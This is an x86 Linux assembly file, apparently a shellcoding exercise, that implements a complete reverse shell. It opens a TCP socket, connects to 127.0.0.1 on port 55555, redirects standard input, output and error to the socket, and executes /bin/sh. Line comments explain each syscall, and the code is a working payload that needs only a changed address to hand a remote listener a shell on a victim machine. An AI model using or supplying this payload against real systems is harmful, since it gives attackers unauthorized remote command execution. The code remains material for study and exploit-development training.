section .text
    global _start

_start: 

       
    mov	eax, 0x66    ;socket call
    mov ebx, 0x1   ; int argument call SYS_SOCKET =1 for socket creation
                   ;socket(AF_INET, SOCK_STREAM, 0)
    xor  edx, edx  ;pass args for the socket connection function by pushing the args into the stack from the to first
    push edx       ; 0 protocol : IPProtocol 
    push ebx       ; 1 type: SOCK_STREAM used to declare a TCP socket (not a UDP wheer we broadcast with SOCK_DGRAM)
    push 0x2       ; 2 socket_family AF_INET for IPv4 IP adresses
    mov  ecx, esp  ; stack pointer to the arguments (the sockadddr_in struct) it will pop them automatically

    int 0x80       ; will return the socket descriptor in eax and will be used as so in the next functions

    mov edi, eax   ; saves the socket filedescriptor in edi 

                     ; connect(s, (struct sockaddr *)&sa, sizeof(sa))
                     ; first creat the struct sockadrr 
    
    push 0x0101017f  ; ip adress 127.0.0.1
    push word 0x03d9 ; port 55555
    push word 0x2    ; 2 AF_INET syscall
    mov  ecx, esp    ; stack pointer to the arguments of socket structure it will pop them automatically
    
                    ;now push on the stack the parameters for the CONNECT function
    push 0x10       ; size of the structure
    push ecx        ; the socket structure (ip, port...)
    push edi        ; socket descriptor created in first call
    mov  ecx, esp   ; args in top of the stack 
    
    mov al, 0x66    ; for SYSCALL_SOCKET 0x66
    mov bl, 0x3     ; SYS_CONNECT to say it's connect 0x3 (where 0x1 = SYS_SOCKET  as used first, 2 for SYS_BIND )
    int 0x80        ; now we call connect()

                    ; I/O Redirection using dup2() : consist of redirecting stdin = 0, stdout = 1 and stderr = 2 

    pop ebx		; moving the file descriptor from the stack
	xor eax, eax	; zeroing out the eax register
	xor ecx, ecx    ; clearing ecx before using the loop
	mov cl, 0x2     ; setting the loop counter (2, 1 then 0)

ioloop:     
       mov al, 0x3F    ; inserting the hex SYS_DUP2 syscall
       int 0x80        ; syscall
       dec ecx         ; the argument for file descriptor(2-stderr,1-stdout,0-stdin)
       jns ioloop

                    ;; call bash witch execve
    

    xor	 ebx, ebx	;give ebx null
    xor  edx, edx 
    push edx		;for null terminator
    push 0x68732f2f	;String "hs//"
    push 0x6e69622f	;String "nib/"  
    
    mov	 ebx, esp
    mov	 ecx, edx	;mov ecx to edx    
    
    mov	 al, 0x0B	;syscall: sys_execve
    int 0x80

    mov eax, 1 
    mov ebx, 1
    int 80h         ; syscall exit(0)





